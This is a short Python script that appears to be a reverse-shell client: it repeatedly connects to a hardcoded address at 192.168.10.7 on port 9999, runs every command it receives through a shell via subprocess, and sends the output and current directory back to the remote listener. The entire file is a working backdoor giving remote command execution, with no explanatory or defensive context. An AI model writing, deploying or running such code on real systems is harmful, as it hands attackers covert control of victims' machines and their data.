import socket
import os
import subprocess


def connect_server():
    while 1:
        host = '192.168.10.7'
        port = 9999
        try:
            global s
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            print("Server is active ")
            break

        except:
            print("Failed. Sleep briefly  try again ")
            s.close()
            continue

def send_cmds():
    data = s.recv(2048)
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))
        print(output_str)
def run_client():
    while 1:
        try:
            connect_server()
            while True:
                send_cmds()
        except Exception as err:
            print (str(err))
            continue
run_client()